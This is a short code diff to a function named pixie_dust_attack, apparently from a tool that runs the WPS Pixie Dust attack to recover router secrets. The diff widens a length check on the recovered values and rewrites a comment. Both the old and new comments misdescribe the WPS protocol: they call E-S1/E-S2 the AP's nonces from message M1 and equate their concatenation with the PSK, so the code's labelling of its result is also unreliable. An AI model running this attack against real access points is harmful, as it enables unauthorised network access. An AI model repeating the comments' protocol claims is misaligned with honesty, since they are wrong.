@@ -222,10 +222,8 @@ def pixie_dust_attack(
             continue
         seen.add(key)
         p1, p2 = engine.pixie_unwrap(e_s1, e_s2, key)
-        if p1 is not None and p2 is not None and len(p1) == 8 and len(p2) == 8:
-            # PSK = E-S1 || E-S2 (16 bytes). PIN is derived from the PSK via
-            # the WPS PIN-KDF (per-chipset); callers can hunt for the PIN by
-            # matching against captured M4/M8 registrant hashes.
+        if p1 is not None and p2 is not None and len(p1) in (8, 16) and len(p2) in (8, 16):
+            # E-S1/E-S2 are the AP's two 128-bit nonces (WPS M1). PSK = E-S1 || E-S2.
             psk = (p1 + p2).hex()
             return PixieDustResult(
                 ok=True, psk=psk, es1=p1, es2=p2,
